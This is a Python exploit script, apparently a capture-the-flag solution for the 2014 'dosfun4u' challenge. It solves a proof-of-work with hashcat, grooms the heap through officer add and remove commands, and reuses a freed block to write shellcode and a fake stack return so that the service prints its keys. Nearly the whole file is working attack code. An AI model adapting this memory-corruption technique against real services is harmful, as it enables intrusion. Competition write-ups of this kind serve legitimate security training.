#!/usr/bin/env python

import socket, subprocess, sys
from struct import pack, unpack

global scenes
global officers

scenes = {}
officers = {}

remote = len(sys.argv) > 1

PORT = 8888
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
if remote:
	HOST = "dosfun4u_5d712652e1d06a362f7fc6d12d66755b.2014.shallweplayaga.me"
else:
	HOST = '127.0.0.1'

def chksum(data):
	ret = 0
	for d in data:
		ret += ord(d)
	return ret & 0xffff

def add_officer(officer_id, status=0, x=0, y=0):
	global officers
	print 'update' if officers.has_key(officer_id) and officers[officer_id] else 'add', 'officer', hex(officer_id)
	officers[officer_id] = True
	payload = pack('H', 0x7d0)
	payload += pack('H', officer_id)
	payload += pack('H', status)
	payload += pack('H', x) 
	payload += pack('H', y)
	payload += pack('H', 0x0)
	return payload

def remove_officer(officer_id):
	global officers
	print 'remove officer', hex(officer_id), 'should work' if officers.has_key(officer_id) and officers[officer_id] else 'should fail'
	officers[officer_id] = False
	payload = pack('H', 0xbb8)
	payload += pack('H', officer_id)
	return payload

def add_scene(scene_id, data2, data3, inline_data='', x=0, y=0):
	global scenes
	print 'update' if scenes.has_key(scene_id) and scenes[scene_id] else 'add', 'scene', hex(scene_id)
	scenes[scene_id] = True
	size1 = len(inline_data)/2
	size2 = len(data2)
	size3 = len(data3)
	payload = pack('H', 0xfa0)
	payload += pack('H', scene_id)
	payload += pack('H', x)
	payload += pack('H', y)
	payload += pack('B', size1)
	payload += pack('B', size2)
	payload += pack('H', size3)
	payload += pack('H', 0)
	payload += inline_data[:size1*2]
	payload += data2
	payload += data3
	return payload

def recv_all(s, size):
	ret = []
	received = 0
	while size > received:
		c = s.recv(size-received)
		if c == '':
			raise Exception('Connection closed')
		ret.append(c)
		received += len(c)
	return ''.join(ret)

def recv_until(s, pattern):
	ret = ''
	while True:
		c = s.recv(1)
		if c == '':
			raise Exception("Connection closed")
		ret += c
		if ret.find(pattern) != -1:
			break
	return ret

s.connect((HOST, PORT))

if remote:
	print s.recv(4096)
	buf = s.recv(4096)
	print buf
	data = buf.split(' ')[0]
	print 'challenge = {}'.format(data)
	print 'hashcatting...'
	p = subprocess.Popen(['./hashcat', data], stdout=subprocess.PIPE);
	result = p.communicate()[0].strip('\n\r\t ')
	print 'response = {}'.format(result)
	s.send(result)

def send_cmd(s,payload,recvLen=0):
	payload += pack('H', chksum(payload))
	s.send(payload)
	return recv_all(s, recvLen)

shellcode = open('shellcode', 'rb').read()

print 'Getting block into free-list'
send_cmd(s,add_officer(1),5)
send_cmd(s,remove_officer(1),5)
print 'Adding officer to reuse block from free-list'
send_cmd(s,add_officer(0xc),5)
print 'Writing shellcode to 008f:0000'
send_cmd(s,add_scene(1, pack("<HHHHHH", 0xc, 0, 0x4688, 0x8f, 0, 0), shellcode),5)
print 'Modifying officer structure to include pointer to fake officer on stack'
send_cmd(s,add_scene(2, pack("<HHHHHH", 1, 0, 0, 0, 0x47aa, 0x011f), "lolololol"),5)
print 'Writing return to shellcode on stack'
send_cmd(s,add_officer(0x945, 0x1d26, 0x10, 0x97),5)

print 'Receiving response...'
print 'Key 1:', recv_until(s,'\n').replace('\x00', '')[:-1]
print 'Key 2:', recv_until(s,'\n')[:-1]
